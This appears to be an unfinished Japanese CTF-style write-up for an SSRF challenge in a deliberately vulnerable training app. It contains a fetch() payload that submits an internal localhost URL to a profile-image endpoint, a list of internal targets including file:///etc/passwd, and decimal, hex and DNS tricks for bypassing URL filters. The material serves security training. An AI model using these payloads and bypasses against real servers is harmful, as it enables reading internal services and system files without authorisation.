# SSRF ❌

**難易度:** ⭐⭐⭐⭐⭐⭐
**カテゴリ:** SSRF (Server-Side Request Forgery)
**目標:** サーバーに内部リソースへアクセスさせる

## ヒント

- **機能:** プロフィール画像 URL アップロード
- **エンドポイント:** `/profile/image/url`
- **脆弱なコード:** `profileImageUrlUpload.js` で URL 検証が不十分

## 攻撃シナリオ

```
1. ユーザーがプロフィール画像URLを指定
2. サーバーが指定URLにアクセスして画像を取得
3. 内部URLを指定 → サーバーが内部リソースにアクセス
```

## 攻撃ペイロード

```javascript
// 内部URLへのアクセス
fetch('/profile/image/url', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({
    imageUrl: 'http://localhost:3000/solve/challenges/server-side?key=...'
  })
})
```

## ターゲットURL（推測）

```
http://localhost:3000/api/...
http://127.0.0.1:3000/...
http://[::1]:3000/...
file:///etc/passwd
```

## バイパス手法

```
# IP アドレスの別表記
http://127.0.0.1 → http://2130706433 (decimal)
http://127.0.0.1 → http://0x7f000001 (hex)
http://localhost → http://localtest.me
```

## 検証ポイント

- [ ] プロフィール画像URL機能を確認
- [ ] 内部URLへのアクセスを試行
- [ ] チャレンジ完了を確認

## 解説

[未着手]
